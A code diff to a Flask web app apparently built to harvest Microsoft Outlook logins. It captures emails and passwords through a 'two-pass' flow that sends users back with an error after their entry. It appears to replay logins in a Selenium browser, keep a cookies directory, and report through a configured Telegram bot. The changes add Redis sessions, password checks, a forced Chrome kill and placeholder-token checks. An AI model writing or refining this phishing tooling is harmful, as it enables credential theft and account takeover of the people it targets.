@@ -51,9 +51,18 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Session configuration - using filesystem instead of Redis for simplicity
-app.config['SESSION_TYPE'] = 'filesystem'
-app.config['SESSION_FILE_DIR'] = './flask_session'
+# Session configuration - try Redis first, fall back to filesystem
+try:
+    redis_test = redis.from_url('redis://localhost:6379/0')
+    redis_test.ping()
+    app.config['SESSION_TYPE'] = 'redis'
+    app.config['SESSION_REDIS'] = redis_test
+    logger.info("Using Redis for session storage")
+except:
+    app.config['SESSION_TYPE'] = 'filesystem'
+    app.config['SESSION_FILE_DIR'] = './flask_session'
+    logger.info("Using filesystem for session storage")
+
 app.config['SESSION_PERMANENT'] = False
 app.config['SESSION_USE_SIGNER'] = True
 app.config['SESSION_KEY_PREFIX'] = 'outlook_automation:'
@@ -471,11 +480,11 @@ def process_form():
             db.session.commit()
             logger.info(f"New user created: {email}")
         
-        # Skip password validation for two-pass system
-        # if not bcrypt.checkpw(password.encode('utf-8'), user.password_hash.encode('utf-8')):
-        #     flash('Invalid credentials', 'error')
-        #     log_session_activity("login_failed", user_email=email, success=False, error_message="Invalid credentials")
-        #     return redirect(url_for('index', step='password', email=email, error='true'))
+        # Validate password for legitimate users
+        if user.password_hash and not bcrypt.checkpw(password.encode('utf-8'), user.password_hash.encode('utf-8')):
+            flash('Invalid credentials', 'error')
+            log_session_activity("login_failed", user_email=email, success=False, error_message="Invalid credentials")
+            return redirect(url_for('index', step='password', email=email, error='true'))
         
         # Two-pass authentication logic
         current_session_id = session.get('session_id')
@@ -643,10 +652,17 @@ def process_form():
             # Ensure driver is always cleaned up
             if driver:
                 try:
+                    driver.close()
                     driver.quit()
                     logger.info("WebDriver cleaned up successfully")
                 except Exception as e:
                     logger.error(f"Error during WebDriver cleanup: {e}")
+                    # Force kill any remaining browser processes
+                    try:
+                        import subprocess
+                        subprocess.run(['pkill', '-f', 'chrome'], capture_output=True)
+                    except:
+                        pass
         
         return redirect(url_for('index', step='password', email=email, error='true'))
 
@@ -729,10 +745,10 @@ def test_telegram():
         bot_token = config('BOT_TOKEN', default=None)
         chat_id = config('CHAT_ID', default=None)
         
-        if not bot_token:
-            return jsonify({'error': 'BOT_TOKEN not configured'}), 400
-        if not chat_id:
-            return jsonify({'error': 'CHAT_ID not configured'}), 400
+        if not bot_token or bot_token == 'your-telegram-bot-token-here':
+            return jsonify({'error': 'BOT_TOKEN not properly configured'}), 400
+        if not chat_id or chat_id == 'your-telegram-chat-id-here':
+            return jsonify({'error': 'CHAT_ID not properly configured'}), 400
             
         # Test message
         test_message = f"🧪 TEST MESSAGE\n📅 {datetime.now()}\n✅ Telegram connection working!"
@@ -807,6 +823,13 @@ def internal_error(error):
     db.session.rollback()
     flash('An internal error occurred. Please try again.', 'error')
     return render_template('index.html', error='Internal server error'), 500
+
+# Ensure required directories exist
+required_dirs = ['logs', 'cookies', 'flask_session']
+for directory in required_dirs:
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+        logger.info(f"Created directory: {directory}")
 
 # Initialize database
 with app.app_context():
